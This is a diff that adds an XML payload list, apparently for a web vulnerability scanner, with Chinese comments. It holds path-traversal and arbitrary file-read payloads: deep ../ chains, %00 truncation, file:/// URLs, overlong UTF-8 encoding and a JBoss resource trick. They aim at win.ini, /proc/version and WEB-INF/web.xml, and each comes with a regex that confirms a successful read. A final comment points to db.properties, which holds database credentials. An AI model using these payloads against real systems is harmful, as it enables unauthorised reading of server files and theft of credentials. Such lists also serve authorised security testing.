@@ -1,0 +1,41 @@
+<?xml version="1.0" encoding="UTF-8"?>
+
+<root>
+    <!-- append_param -->
+    <type value="append_value">
+        <!--$file = file_get_contents("upload/".$_GET['filename']); file_get_content 支持 c:/windows/win.ini、file:///windows/win.ini、../../../windows/win.ini-->
+        <!--考虑$file = file_get_contents("upload/".$_GET['filename']); 前面又目录限定情况-->
+        <!--可能失败,如果php文件在可能在c盘-->
+        <payload value="../../../../../../../../../../../../../../../../windows/win.ini" regexp="; for 16-bit app support"/>
+        <payload value="../../../../../../../../../../../../../../../../proc/version" regexp="Linux version.*?gcc version"/>
+        <!--考虑$file = file_get_contents("upload/".$_GET['filename'].".txt"); 截断情况-->
+        <payload value="../../../../../../../../../../../../../../../../windows/win.ini%00" regexp="; for 16-bit app support"/>
+        <payload value="../../../../../../../../../../../../../../../../proc/version%00" regexp="Linux version.*?gcc version"/>
+        <!--由于有固定目录在F盘F:\tomcat5.5\webapps\，不能读取系统文件，只能读取配置文件-->
+        <payload value="../WEB-INF/web.xml" regexp="&lt;param-name&gt;"/>
+        <payload value="../../WEB-INF/web.xml" regexp="&lt;param-name&gt;"/>
+    </type>
+
+    <!-- repleace_param -->
+    <type value="repleace_value">
+        <!--curl_setopt($ch, CURLOPT_URL, $url); 支持file:///windows/win.ini-->
+        <payload value="file:///windows/win.ini" regexp="; for 16-bit app support"/>
+        <payload value="file:///proc/version" regexp="Linux version.*?gcc version"/>
+    </type>
+
+      <!-- host -->
+    <type value="host">
+        <!--代理配置或者python框架的问题，或者反代问题-->
+        <payload value="../../../../../../../../../../../../../../../../proc/version" regexp="Linux version.*?gcc version"/>
+        <!--java-->
+        <payload value="%c0%ae/WEB-INF/web.xml%C0%80.jsp" regexp="&lt;param-name&gt;"/>
+        <!--jboss-->
+        <payload value="javax.faces.resource.../WEB-INF/web.xml.jsf" regexp="&lt;param-name&gt;"/>
+        <!--反代问题-->
+        <payload value="WEB-INF/web.xml" regexp="&lt;param-name&gt;"/>
+    </type>
+
+    <!--利用-->
+    <!--WEB-INF/classes/db.properties-->
+
+</root>
